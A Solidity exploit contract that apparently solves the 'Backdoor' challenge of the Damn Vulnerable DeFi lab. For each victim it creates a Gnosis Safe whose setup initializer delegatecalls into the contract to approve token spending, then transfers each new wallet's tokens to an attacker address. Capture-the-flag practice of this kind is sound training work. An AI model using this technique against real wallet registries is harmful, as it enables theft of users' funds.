pragma solidity 0.8.12;

import {GnosisSafe} from "gnosis/GnosisSafe.sol";
import {GnosisSafeProxy} from "gnosis/proxies/GnosisSafeProxy.sol";
import {GnosisSafeProxyFactory} from "gnosis/proxies/GnosisSafeProxyFactory.sol";
import {IProxyCreationCallback} from "gnosis/proxies/IProxyCreationCallback.sol";
import {WalletRegistry} from "./WalletRegistry.sol";
import {BackDoorModule} from "./BackDoorModule.sol";
import "../DamnValuableToken.sol";
import "forge-std/Test.sol";

// Your contract
contract WalletCreator {
    // Address of the Gnosis Safe master copy contract
    address immutable gnosisSafeMasterCopy;

    // Address of the Gnosis Safe proxy factory contract
    address immutable gnosisSafeProxyFactory;

    address immutable paymentToken;

    WalletRegistry immutable walletRegistry;

    BackDoorModule private _backdoormodule;

    address[] public _victims;

    address immutable attacker;

    uint256 private constant MAX_THRESHOLD = 1;

    constructor(
        address gnosisSafeMasterCopy_,
        address gnosisSafeProxyFactory_,
        WalletRegistry walletRegistry_,
        address[] memory victims_,
        address paymentToken_,
        address attacker_
    ) {
        gnosisSafeMasterCopy = gnosisSafeMasterCopy_;
        gnosisSafeProxyFactory = gnosisSafeProxyFactory_;
        walletRegistry = walletRegistry_;
        _victims = victims_;
        paymentToken = paymentToken_;
        attacker = attacker_;
    }

    function setupAllowance(address _attacker) external {
        DamnValuableToken(paymentToken).approve(address(_attacker), 10 ether);
    }

    // Safes created via the official interfaces use the DefaultCallbackHandler as their fallback handler.
    // A fallback handler can be replaced or extended anytime via a regular Safe transaction
    // (respecting threshold and owners of the Safe).
    function createGnosisSafeWallet() public {
        uint256 counter = 0;
        bytes memory data = abi.encodeWithSignature(
            "setupAllowance(address)",
            address(this)
        );

        for (counter; counter < _victims.length; counter++) {
            address user = _victims[counter];
            address[] memory victim = new address[](1);
            victim[0] = user;
            //  await safe.setup([user1.address, user2.address], 1, AddressZero, "0x", handler.address, AddressZero, 0, AddressZero)
            bytes memory initializer = abi.encodeWithSignature(
                "setup(address[],uint256,address,bytes,address,address,uint256,address)",
                victim,
                MAX_THRESHOLD,
                address(this),
                data,
                address(0),
                address(0),
                uint256(0),
                address(0)
            );
            // Create a unique nonce for the proxy contract
            uint256 saltNonce = uint256(
                keccak256(abi.encodePacked(block.timestamp, msg.sender))
            );

            // Call the createProxyWithCallback function to create the proxy contract
            GnosisSafeProxy proxy = GnosisSafeProxyFactory(
                gnosisSafeProxyFactory
            ).createProxyWithCallback(
                    address(gnosisSafeMasterCopy), // The singleton contract
                    initializer, // The initializer data
                    saltNonce, // The nonce
                    IProxyCreationCallback(walletRegistry) // The callback contract
                );

            DamnValuableToken(paymentToken).transferFrom(
                address(proxy),
                attacker,
                10 ether
            );
        }
    }
}
